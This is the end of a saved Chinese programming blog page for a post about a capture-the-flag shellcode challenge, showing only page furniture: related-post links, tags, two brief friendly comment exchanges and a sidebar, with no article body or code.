</script></center><p></p>
<br><div  style="float:left">
    <div  id="bdshare"  class="bdshare_t bds_tools_32 get-codes-bdshare">
        <a  class="bds_tsina"  title="分享到新浪微博"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_tqq"  title="分享到腾讯微博"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_qzone"  title="分享到QQ空间"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_baidu"  title="分享到百度云收藏"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_renren"  title="分享到人人网"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_fbook"  title="分享到Facebook"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_twi"  title="分享到Twitter"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_deli"  title="分享到delicious"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_douban"  title="分享到豆瓣网"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_diandian"  title="分享到点点网"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_ff"  title="分享到饭否"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_ty"  title="分享到天涯社区"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_hx"  title="分享到和讯"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_tieba"  title="分享到百度贴吧"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_xg"  title="分享到鲜果"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <span  class="bds_more">更多</span>
		<a  class="shareCount"  href="http://www.programlife.net/shellcode-diy.html#"  title="累计分享0次">0</a>
    </div>
<script  type="text/javascript"  id="bdshare_js"  data="type=tools&amp;uid=286358"  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/bds_s_v2.js"></script>

<script  type="text/javascript">
	document.getElementById("bdshell_js").src = "http://share.baidu.com/static/js/shell_v2.js?cdnversion=" + new Date().getHours();
</script>
</div><br><br><br><div  class="yarpp-related">
您可能对下面的文章也感兴趣:<ol>
<li><a  href="http://www.programlife.net/conficker-kido-shellcode.html"  rel="bookmark"  title="Conficker/Kido ShellCode">Conficker/Kido ShellCode</a></li>
<li><a  href="http://www.programlife.net/borland-cpp-oep-style.html"  rel="bookmark"  title="Borland C++入口点特征码">Borland C++入口点特征码</a></li>
<li><a  href="http://www.programlife.net/win32-bind-port-shellcode.html"  rel="bookmark"  title="Win32 bind port shellcode(4444 tcp) 399 bytes">Win32 bind port shellcode(4444 tcp) 399 bytes</a></li>
<li><a  href="http://www.programlife.net/reference-always-refer-to-the-initial-variable.html"  rel="bookmark"  title="引用，其实不可以改变指向">引用，其实不可以改变指向</a></li>
<li><a  href="http://www.programlife.net/whether-reference-allocate-memory.html"  rel="bookmark"  title="引用不分配内存？">引用不分配内存？</a></li>
</ol>
<img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/f68dd2768d15002112cab152b57be0d8">
</div>
			
		<script  type="text/javascript">
			document.body.oncopy = function () {
				if (window.clipboardData) {
					setTimeout(function () {
						var text = clipboardData.getData("text");
						if (text && text.length > 100) {
							text = text + "\r\nCopyed From 程序人生 \r\nHome Page:http://www.programlife.net \r\nSource URL:http://www.programlife.net/shellcode-diy.html ";
							clipboardData.setData("text", text);
						}
					}, 100);
				}
			}
		</script>

			
			<div  class="fixed"></div>
		</div>
		<div  class="under">
			<span  class="categories">分类: </span><span><a  href="http://www.programlife.net/category/windev/malware-windev"  title="查看恶意代码中的全部文章"  rel="category tag">恶意代码</a></span>			<span  class="tags">标签: </span><span><a  href="http://www.programlife.net/tag/metasploit"  rel="tag">Metasploit</a>, <a  href="http://www.programlife.net/tag/shellcode"  rel="tag">ShellCode</a>, <a  href="http://www.programlife.net/tag/xdctf"  rel="tag">XDCTF</a></span>		</div>
	</div>

	
		

	<script  type="text/javascript"  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/comment.js"></script>

















<div  id="comments">





<div  id="cmtswitcher">


	

		<a  id="commenttab"  class="curtab"  href="javascript:void(0);" >评论 (2)</a>


		<a  id="trackbacktab"  class="tab"  href="javascript:void(0);" >Trackbacks (0)</a>


	

	

		<span  class="addcomment"><a  href="http://www.programlife.net/shellcode-diy.html#respond">发表评论</a></span>


	

	

		<span  class="addtrackback"><a  href="http://www.programlife.net/shellcode-diy.html/trackback">Trackback</a></span>


	

	<div  class="fixed"></div>


</div>





<div  id="commentlist">


	


	<ol  id="thecomments">


	
	<li  class="comment regularcomment"  id="comment-4517">

		<div  class="author">

			<div  class="pic">

				<img  alt=""  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/57f7d69a4ffb3b4318541931823a7abb"  class="avatar avatar-32 photo"  height="32"  width="32">
			</div>

			<div  class="name">

				
					<a  id="commentauthor-4517"  class="url"  href="http://www.tanglei.name/"  rel="external nofollow">

				


				tanglei


				
					</a>

				
			</div>

		</div>



		<div  class="info">

			<div  class="date">

				2013年10月7日22:32
					 | <a  href="http://www.programlife.net/shellcode-diy.html#comment-4517">#1</a>

			</div>

			<div  class="act">

				<a  href="javascript:void(0);" >回复</a> | 

				<a  href="javascript:void(0);" >引用</a>

							</div>
			<div  class="fixed"></div>
			<div  class="content">
								<div  id="commentbody-4517">
					<p>刚查了下，貌似这个比赛 还挺有趣滴？<br>
p.s 国庆充实啊。</p>
<p  class="thdrpy">[<a  href="javascript:void(0)" >回复</a>]</p><div  class="comment-childs chalt"  id="comment-4518"><img  alt=""  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/328ea4d54443c40bbd7b8093545fd783"  class="avatar avatar-32 photo"  height="32"  width="32"><p><cite><a  href="http://www.programlife.net/"  rel="external nofollow"  class="url">代码疯子</a></cite> 回复:<br><small  class="commentmetadata">十月 7th, 2013 at 23:11</small></p><p>@tanglei, 不怎么有趣，另外国庆累坏了，不过去清华溜达了一圈 <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/003.gif"  alt="[em012]"  class="wp-smiley"> </p>
<p  class="thdrpy">[<a  href="javascript:void(0)" >回复</a>]</p></div>				</div>
			</div>
		</div>
		<div  class="fixed"></div>
</li>

	<li  class="comment regularcomment"  id="comment-4519">

		<div  class="author">

			<div  class="pic">

				<img  alt=""  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/c9605cacba26540aaea3c7ca8ecbafab"  class="avatar avatar-32 photo"  height="32"  width="32">
			</div>

			<div  class="name">

				
					<a  id="commentauthor-4519"  class="url"  href="http://github.com/kedebug"  rel="external nofollow">

				


				kedebug


				
					</a>

				
			</div>

		</div>



		<div  class="info">

			<div  class="date">

				2013年10月8日19:27
					 | <a  href="http://www.programlife.net/shellcode-diy.html#comment-4519">#2</a>

			</div>

			<div  class="act">

				<a  href="javascript:void(0);" >回复</a> | 

				<a  href="javascript:void(0);" >引用</a>

							</div>
			<div  class="fixed"></div>
			<div  class="content">
								<div  id="commentbody-4519">
					<p>膜拜，科神吊炸天</p>
<p  class="thdrpy">[<a  href="javascript:void(0)" >回复</a>]</p><div  class="comment-childs chalt"  id="comment-4520"><img  alt=""  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/328ea4d54443c40bbd7b8093545fd783"  class="avatar avatar-32 photo"  height="32"  width="32"><p><cite><a  href="http://www.programlife.net/"  rel="external nofollow"  class="url">代码疯子</a></cite> 回复:<br><small  class="commentmetadata">十月 8th, 2013 at 19:30</small></p><p>@kedebug, 膜拜高富帅啊！我这是没营养的东西，也很久没看了，现在就写写代码。</p>
<p  class="thdrpy">[<a  href="javascript:void(0)" >回复</a>]</p></div>				</div>
			</div>
		</div>
		<div  class="fixed"></div>
</li>


	</ol>


	










	


	

		<ol  id="thetrackbacks">


			

				<li  class="messagebox">


					本文目前尚无任何 trackbacks 和 pingbacks.

				</li>





			

		</ol>


	

	<div  class="fixed"></div>


	


</div>





</div>









	<form  action="http://www.programlife.net/wp-comments-post.php"  method="post"  id="commentform">


	<div  id="respond">





		

			




			<div  id="author_info">


				<div  class="row">


					<input  type="text"  name="author"  id="author"  class="textfield"  value=""  size="24"  tabindex="1">


					<label  for="author"  class="small">昵称 (必填)</label>


				</div>


				<div  class="row">


					<input  type="text"  name="email"  id="email"  class="textfield"  value=""  size="24"  tabindex="2">


					<label  for="email"  class="small">电子邮箱 (我们会为您保密) (必填)</label>


				</div>


				<div  class="row">


					<input  type="text"  name="url"  id="url"  class="textfield"  value=""  size="24"  tabindex="3">


					<label  for="url"  class="small">网址</label>


				</div>


			</div>





			




		




		


		<div  class="row">


			<textarea  name="comment"  id="comment"  tabindex="4"  rows="8"  cols="50"></textarea>


		</div>





		


		<div  id="submitbox">


			<a  class="feed"  href="http://www.programlife.net/comments/feed">订阅评论</a>


			<div  class="submitbutton">


				<input  name="submit"  type="submit"  id="submit"  class="button"  tabindex="5"  value="提交评论">


			</div>


			

			<input  type="hidden"  name="comment_post_ID"  value="2841">


			<div  class="fixed"></div>


		</div>





	</div>


	<p  style="display: none;"><input  type="hidden"  id="akismet_comment_nonce"  name="akismet_comment_nonce"  value="d228b1b45a"></p>
	
	<style  type="text/css">
	img.wp-smiley-select {cursor: pointer;}
	</style>
    <script  type="text/javascript">
    function grin(tag) {
    	if (typeof tinyMCE != 'undefined') {
    		grin_tinymcecomments(tag);
    	} else {
    		grin_plain(tag);
    	}
    }
    function grin_tinymcecomments(tag) {
    	tinyMCE.execCommand('mceInsertContent', false, ' ' + tag + ' ');
    }
    
    function grin_plain(tag) {
    	var myField;
    	var myCommentTextarea = "comment";
    	tag = ' ' + tag + ' ';
        if (document.getElementById(myCommentTextarea) && document.getElementById(myCommentTextarea).type == 'textarea') {
    		myField = document.getElementById(myCommentTextarea);
    	} else {
    		return false;
    	}
    	if (document.selection) {
    		myField.focus();
    		sel = document.selection.createRange();
    		sel.text = tag;
    		myField.focus();
    	}
    	else if (myField.selectionStart || myField.selectionStart == '0') {
    		var startPos = myField.selectionStart;
    		var endPos = myField.selectionEnd;
    		var cursorPos = endPos;
    		myField.value = myField.value.substring(0, startPos)
    					  + tag
    					  + myField.value.substring(endPos, myField.value.length);
    		cursorPos += tag.length;
    		myField.focus();
    		myField.selectionStart = cursorPos;
    		myField.selectionEnd = cursorPos;
    	}
    	else {
    		myField.value += tag;
    		myField.focus();
    	}
    }
    
    function moreSmilies() {
    	document.getElementById('wp-smiley-more').style.display = 'inline';
    	document.getElementById('wp-smiley-toggle').innerHTML = '<a href="javascript:lessSmilies()">&laquo;&nbsp;less</a></span>';
    }
    
    function lessSmilies() {
    	document.getElementById('wp-smiley-more').style.display = 'none';
    	document.getElementById('wp-smiley-toggle').innerHTML = '<a href="javascript:moreSmilies()">more&nbsp;&raquo;</a>';
    }
    </script>
<img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/021.gif"  alt="[em022]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/022.gif"  alt="[em021]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/002.gif"  alt="[em020]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/005.gif"  alt="[em019]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/013.gif"  alt="[em018]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/018.gif"  alt="[em017]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/016.gif"  alt="[em016]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/015.gif"  alt="[em015]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/001.gif"  alt="[em014]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/004.gif"  alt="[em013]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/003.gif"  alt="[em012]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/012.gif"  alt="[em011]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/009.gif"  alt="[em010]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/007.gif"  alt="[em009]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/017.gif"  alt="[em008]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/006.gif"  alt="[em007]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/014.gif"  alt="[em006]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/008.gif"  alt="[em005]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/011.gif"  alt="[em004]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/019.gif"  alt="[em003]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/020.gif"  alt="[em002]"   class="wp-smiley-select"> <img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/010.gif"  alt="[em001]"   class="wp-smiley-select"> <p><input  type="hidden"  id="comment_reply_ID"  name="comment_reply_ID"  value="0"><input  type="hidden"  id="comment_reply_dp"  name="comment_reply_dp"  value="0"></p><div  id="cancel_reply"  style="display:none;"><a  href="javascript:void(0)"   style="color:red;">点击取消回复</a></div><script  type="text/javascript">
/* <![CDATA[ */
var commentformid = "commentform";
var USERINFO = false;
var atreply = "author";
/* ]]> */
</script>
<script  type="text/javascript"  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/wp-thread-comment.js.php"></script>


	</form>





	









	<div  id="postnavi">
		<span  class="prev"><a  href="http://www.programlife.net/cmd-multi-commands.html"  rel="next">CMD批处理执行多个命令</a></span>
		<span  class="next"><a  href="http://www.programlife.net/cpp-singleton-memory-retrieve.html"  rel="prev">C++单例模式Singleton内存回收</a></span>
		<div  class="fixed"></div>
	</div>


	</div>

	



	




<div  id="sidebar">





<div  id="northsidebar"  class="sidebar">



	

	


<div  id="text-6"  class="widget widget_text"><h3>订阅本站</h3>			<div  class="textwidget">推荐订阅本站全文RSS，请订阅<strong><a  href="http://www.programlife.net/feed"  target="_blank"><font  color="blue">RSS页面</font></a></strong><br>
如需要搜索本站的内容，请点击<strong><a  href="http://www.programlife.net/googlesearch"><font  color="red">站内搜索</font></a></strong>
<br>查看其他转载收集内容，请点击<strong><a  href="http://www.programlife.net/learn"  target="_blank"><font  color="blue">文档手册</font></a></strong><br>查看关于我的个人介绍，请点击<strong><a  href="http://www.programlife.net/about"  target="_blank"><font  color="blue">关于页面</font></a></strong><br>

<div  id="google_translate_element"><div  class="skiptranslate goog-te-gadget"  dir="ltr"  style=""><div  id=":0.targetLanguage"  style="display: inline;"><select  class="goog-te-combo"><option  value="">选择语言</option><option  value="de">德语</option><option  value="ru">俄语</option><option  value="fr">法语</option><option  value="ja">日语</option><option  value="hi">印地语</option><option  value="en">英语</option><option  value="zh-TW">中文(繁体)</option></select></div>&nbsp;&nbsp;由 <span  style="white-space:nowrap"><a  class="goog-logo-link"  href="https://translate.google.com/"  target="_blank"><img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/google_logo_41.png"  width="37px"  height="13px"  style="padding-right: 3px">Google 翻译</a></span>强力驱动</div></div><script>
function googleTranslateElementInit() {
  new google.translate.TranslateElement({
    pageLanguage: 'zh-CN',
    includedLanguages: 'de,ru,fr,ja,hi,en,zh-TW,zh-CN',
    layout: google.translate.TranslateElement.InlineLayout.HORIZONTAL
  }, 'google_translate_element');
}
</script><script  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/element.js"></script>

    <div  id="bdshare"  class="bdshare_t bds_tools get-codes-bdshare">
        <a  class="bds_tsina"  title="分享到新浪微博"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_tqq"  title="分享到腾讯微博"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_renren"  title="分享到人人网"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_qzone"  title="分享到QQ空间"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_douban"  title="分享到豆瓣网"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_fbook"  title="分享到Facebook"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_twi"  title="分享到Twitter"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_diandian"  title="分享到点点网"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <a  class="bds_xg"  title="分享到鲜果"  href="http://www.programlife.net/shellcode-diy.html#"></a>
        <span  class="bds_more"></span>
		<a  class="shareCount"  href="http://www.programlife.net/shellcode-diy.html#"  title="累计分享0次">0</a>
    </div>
<script  type="text/javascript"  id="bdshare_js"  data="type=tools&amp;mini=1&amp;uid=286358"></script>

<script  type="text/javascript">
	document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + new Date().getHours();
</script>

<div  class="fixed"></div></div>
		</div><div  id="archives-3"  class="widget widget_archive"><h3>文章归档</h3>		<select  name="archive-dropdown" > <option  value="">选择月份</option> 	<option  value="http://www.programlife.net/2013/10"> 2013年十月 &nbsp;(3)</option>
	<option  value="http://www.programlife.net/2013/09"> 2013年九月 &nbsp;(3)</option>
	<option  value="http://www.programlife.net/2013/08"> 2013年八月 &nbsp;(2)</option>
	<option  value="http://www.programlife.net/2013/07"> 2013年七月 &nbsp;(3)</option>
	<option  value="http://www.programlife.net/2013/06"> 2013年六月 &nbsp;(2)</option>
	<option  value="http://www.programlife.net/2013/05"> 2013年五月 &nbsp;(1)</option>
	<option  value="http://www.programlife.net/2013/04"> 2013年四月 &nbsp;(4)</option>
	<option  value="http://www.programlife.net/2013/03"> 2013年三月 &nbsp;(2)</option>
	<option  value="http://www.programlife.net/2013/02"> 2013年二月 &nbsp;(1)</option>
	<option  value="http://www.programlife.net/2013/01"> 2013年一月 &nbsp;(3)</option>
	<option  value="http://www.programlife.net/2012/12"> 2012年十二月 &nbsp;(6)</option>
	<option  value="http://www.programlife.net/2012/11"> 2012年十一月 &nbsp;(3)</option>
	<option  value="http://www.programlife.net/2012/10"> 2012年十月 &nbsp;(3)</option>
	<option  value="http://www.programlife.net/2012/09"> 2012年九月 &nbsp;(5)</option>
	<option  value="http://www.programlife.net/2012/08"> 2012年八月 &nbsp;(4)</option>
	<option  value="http://www.programlife.net/2012/07"> 2012年七月 &nbsp;(3)</option>
	<option  value="http://www.programlife.net/2012/06"> 2012年六月 &nbsp;(4)</option>
	<option  value="http://www.programlife.net/2012/05"> 2012年五月 &nbsp;(6)</option>
	<option  value="http://www.programlife.net/2012/04"> 2012年四月 &nbsp;(4)</option>
	<option  value="http://www.programlife.net/2012/03"> 2012年三月 &nbsp;(7)</option>
	<option  value="http://www.programlife.net/2012/02"> 2012年二月 &nbsp;(4)</option>
	<option  value="http://www.programlife.net/2012/01"> 2012年一月 &nbsp;(10)</option>
	<option  value="http://www.programlife.net/2011/12"> 2011年十二月 &nbsp;(15)</option>
	<option  value="http://www.programlife.net/2011/11"> 2011年十一月 &nbsp;(10)</option>
	<option  value="http://www.programlife.net/2011/10"> 2011年十月 &nbsp;(14)</option>
	<option  value="http://www.programlife.net/2011/09"> 2011年九月 &nbsp;(21)</option>
	<option  value="http://www.programlife.net/2011/08"> 2011年八月 &nbsp;(11)</option>
	<option  value="http://www.programlife.net/2011/07"> 2011年七月 &nbsp;(8)</option>
	<option  value="http://www.programlife.net/2011/06"> 2011年六月 &nbsp;(21)</option>
	<option  value="http://www.programlife.net/2011/05"> 2011年五月 &nbsp;(16)</option>
	<option  value="http://www.programlife.net/2011/04"> 2011年四月 &nbsp;(27)</option>
	<option  value="http://www.programlife.net/2011/03"> 2011年三月 &nbsp;(26)</option>
	<option  value="http://www.programlife.net/2011/02"> 2011年二月 &nbsp;(17)</option>
	<option  value="http://www.programlife.net/2011/01"> 2011年一月 &nbsp;(8)</option>
	<option  value="http://www.programlife.net/2010/12"> 2010年十二月 &nbsp;(31)</option>
	<option  value="http://www.programlife.net/2010/11"> 2010年十一月 &nbsp;(50)</option>
	<option  value="http://www.programlife.net/2010/10"> 2010年十月 &nbsp;(50)</option>
	<option  value="http://www.programlife.net/2010/09"> 2010年九月 &nbsp;(74)</option>
 </select>
</div><div  id="text-7"  class="widget widget_text"><h3>AD</h3>			<div  class="textwidget"><ul  class="links"> 
<li><a  href="http://www.7ien.net/"  title="彩票投注软件"  target="_blank">彩票投注软件</a></li>
<li><a  href="http://www.zrtcn.com/"  title="东莞环境监测"  target="_blank">东莞环境监测</a></li>
<li><a  href="http://www.fujiyusoki.com.hk/"  title="码垛机器人"  target="_blank">码垛机器人</a></li>
</ul>
<div  class="fixed"></div></div>
		</div>		<div  id="recent-posts-4"  class="widget widget_recent_entries">		<h3>近期文章</h3>		<ul>
					<li>
				<a  href="http://www.programlife.net/github-alipay.html"  title="5月1日前注册的GitHub账号可领取20元">5月1日前注册的GitHub账号可领取20元</a>
						</li>
					<li>
				<a  href="http://www.programlife.net/cmd-multi-commands.html"  title="CMD批处理执行多个命令">CMD批处理执行多个命令</a>
						</li>
					<li>
				<a  href="http://www.programlife.net/shellcode-diy.html"  title="[XDCTF]Shellcode DIY">[XDCTF]Shellcode DIY</a>
						</li>
					<li>
				<a  href="http://www.programlife.net/cpp-singleton-memory-retrieve.html"  title="C++单例模式Singleton内存回收">C++单例模式Singleton内存回收</a>
						</li>
					<li>
				<a  href="http://www.programlife.net/msvc-crt-startup.html"  title="MSVC CRT运行库启动代码分析">MSVC CRT运行库启动代码分析</a>
						</li>
					<li>
				<a  href="http://www.programlife.net/chrome-basictypes.html"  title="Chrome源码阅读之basictypes.h">Chrome源码阅读之basictypes.h</a>
						</li>
					<li>
				<a  href="http://www.programlife.net/chrome-source-code-compile.html"  title="Chrome源码编译">Chrome源码编译</a>
						</li>
					<li>
				<a  href="http://www.programlife.net/2013-08-summary.html"  title="八月流水账">八月流水账</a>
						</li>
					<li>
				<a  href="http://www.programlife.net/android-crackme3.html"  title="简单Android CrackMe分析3">简单Android CrackMe分析3</a>
						</li>
					<li>
				<a  href="http://www.programlife.net/android-crackme2.html"  title="简单Android CrackMe分析2">简单Android CrackMe分析2</a>
						</li>
				</ul>
		</div><div  id="tag_cloud-5"  class="widget widget_tag_cloud"><h3>标签列表</h3><div  class="tagcloud"><a  href="http://www.programlife.net/tag/acm"  class="tag-link-55"  title="16个话题"  style="font-size: 16.647058823529pt;">ACM</a>
<a  href="http://www.programlife.net/tag/adsense"  class="tag-link-97"  title="4个话题"  style="font-size: 9.3725490196078pt;">AdSense</a>
<a  href="http://www.programlife.net/tag/android"  class="tag-link-83"  title="6个话题"  style="font-size: 11.43137254902pt;">Android</a>
<a  href="http://www.programlife.net/tag/asm-2"  class="tag-link-103"  title="7个话题"  style="font-size: 12.117647058824pt;">ASM</a>
<a  href="http://www.programlife.net/tag/bfs"  class="tag-link-349"  title="4个话题"  style="font-size: 9.3725490196078pt;">BFS</a>
<a  href="http://www.programlife.net/tag/bt"  class="tag-link-89"  title="4个话题"  style="font-size: 9.3725490196078pt;">BT</a>
<a  href="http://www.programlife.net/tag/c-3"  class="tag-link-62"  title="5个话题"  style="font-size: 10.470588235294pt;">C</a>
<a  href="http://www.programlife.net/tag/c-2"  class="tag-link-16"  title="35个话题"  style="font-size: 21.176470588235pt;">C++</a>
<a  href="http://www.programlife.net/tag/chrome"  class="tag-link-253"  title="7个话题"  style="font-size: 12.117647058824pt;">Chrome</a>
<a  href="http://www.programlife.net/tag/contest"  class="tag-link-57"  title="4个话题"  style="font-size: 9.3725490196078pt;">Contest</a>
<a  href="http://www.programlife.net/tag/crackme"  class="tag-link-762"  title="4个话题"  style="font-size: 9.3725490196078pt;">CrackMe</a>
<a  href="http://www.programlife.net/tag/csdn"  class="tag-link-266"  title="6个话题"  style="font-size: 11.43137254902pt;">CSDN</a>
<a  href="http://www.programlife.net/tag/c%e8%af%ad%e8%a8%80"  class="tag-link-171"  title="6个话题"  style="font-size: 11.43137254902pt;">C语言</a>
<a  href="http://www.programlife.net/tag/ddk"  class="tag-link-237"  title="7个话题"  style="font-size: 12.117647058824pt;">DDK</a>
<a  href="http://www.programlife.net/tag/delete"  class="tag-link-41"  title="3个话题"  style="font-size: 8pt;">delete</a>
<a  href="http://www.programlife.net/tag/dll"  class="tag-link-555"  title="5个话题"  style="font-size: 10.470588235294pt;">DLL</a>
<a  href="http://www.programlife.net/tag/error"  class="tag-link-24"  title="41个话题"  style="font-size: 22pt;">Error</a>
<a  href="http://www.programlife.net/tag/exploit-2"  class="tag-link-582"  title="4个话题"  style="font-size: 9.3725490196078pt;">exploit</a>
<a  href="http://www.programlife.net/tag/gcc"  class="tag-link-23"  title="3个话题"  style="font-size: 8pt;">GCC</a>
<a  href="http://www.programlife.net/tag/godaddy"  class="tag-link-77"  title="5个话题"  style="font-size: 10.470588235294pt;">GoDaddy</a>
<a  href="http://www.programlife.net/tag/google"  class="tag-link-82"  title="11个话题"  style="font-size: 14.588235294118pt;">Google</a>
<a  href="http://www.programlife.net/tag/hdu"  class="tag-link-289"  title="6个话题"  style="font-size: 11.43137254902pt;">HDU</a>
<a  href="http://www.programlife.net/tag/heapsort"  class="tag-link-155"  title="3个话题"  style="font-size: 8pt;">HeapSort</a>
<a  href="http://www.programlife.net/tag/heapspray"  class="tag-link-862"  title="4个话题"  style="font-size: 9.3725490196078pt;">HeapSpray</a>
<a  href="http://www.programlife.net/tag/hook"  class="tag-link-485"  title="5个话题"  style="font-size: 10.470588235294pt;">HOOK</a>
<a  href="http://www.programlife.net/tag/http"  class="tag-link-44"  title="3个话题"  style="font-size: 8pt;">HTTP</a>
<a  href="http://www.programlife.net/tag/icpc"  class="tag-link-56"  title="15个话题"  style="font-size: 16.235294117647pt;">ICPC</a>
<a  href="http://www.programlife.net/tag/ida"  class="tag-link-107"  title="6个话题"  style="font-size: 11.43137254902pt;">IDA</a>
<a  href="http://www.programlife.net/tag/ie"  class="tag-link-752"  title="4个话题"  style="font-size: 9.3725490196078pt;">IE</a>
<a  href="http://www.programlife.net/tag/ipv6"  class="tag-link-88"  title="4个话题"  style="font-size: 9.3725490196078pt;">IPv6</a>
<a  href="http://www.programlife.net/tag/irp"  class="tag-link-473"  title="4个话题"  style="font-size: 9.3725490196078pt;">IRP</a>
<a  href="http://www.programlife.net/tag/iscc"  class="tag-link-592"  title="16个话题"  style="font-size: 16.647058823529pt;">ISCC</a>
<a  href="http://www.programlife.net/tag/iterator"  class="tag-link-25"  title="4个话题"  style="font-size: 9.3725490196078pt;">iterator</a>
<a  href="http://www.programlife.net/tag/linux"  class="tag-link-111"  title="27个话题"  style="font-size: 19.666666666667pt;">Linux</a>
<a  href="http://www.programlife.net/tag/map"  class="tag-link-310"  title="5个话题"  style="font-size: 10.470588235294pt;">map</a>
<a  href="http://www.programlife.net/tag/metasploit"  class="tag-link-757"  title="4个话题"  style="font-size: 9.3725490196078pt;">Metasploit</a>
<a  href="http://www.programlife.net/tag/mfc"  class="tag-link-426"  title="5个话题"  style="font-size: 10.470588235294pt;">MFC</a>
<a  href="http://www.programlife.net/tag/od"  class="tag-link-166"  title="7个话题"  style="font-size: 12.117647058824pt;">od</a>
<a  href="http://www.programlife.net/tag/oep"  class="tag-link-509"  title="8个话题"  style="font-size: 12.803921568627pt;">OEP</a>
<a  href="http://www.programlife.net/tag/ollydbg"  class="tag-link-503"  title="10个话题"  style="font-size: 14.039215686275pt;">Ollydbg</a>
<a  href="http://www.programlife.net/tag/pe"  class="tag-link-497"  title="10个话题"  style="font-size: 14.039215686275pt;">PE</a>
<a  href="http://www.programlife.net/tag/poj"  class="tag-link-268"  title="4个话题"  style="font-size: 9.3725490196078pt;">POJ解题报告</a>
<a  href="http://www.programlife.net/tag/python"  class="tag-link-614"  title="7个话题"  style="font-size: 12.117647058824pt;">Python</a>
<a  href="http://www.programlife.net/tag/reverse"  class="tag-link-125"  title="3个话题"  style="font-size: 8pt;">reverse</a>
<a  href="http://www.programlife.net/tag/sdk"  class="tag-link-192"  title="9个话题"  style="font-size: 13.490196078431pt;">SDK</a>
<a  href="http://www.programlife.net/tag/seh"  class="tag-link-560"  title="4个话题"  style="font-size: 9.3725490196078pt;">SEH</a>
<a  href="http://www.programlife.net/tag/set"  class="tag-link-75"  title="3个话题"  style="font-size: 8pt;">set</a>
<a  href="http://www.programlife.net/tag/sgi"  class="tag-link-148"  title="3个话题"  style="font-size: 8pt;">SGI</a>
<a  href="http://www.programlife.net/tag/shellcode"  class="tag-link-610"  title="8个话题"  style="font-size: 12.803921568627pt;">ShellCode</a>
<a  href="http://www.programlife.net/tag/sizeof"  class="tag-link-120"  title="5个话题"  style="font-size: 10.470588235294pt;">sizeof</a>
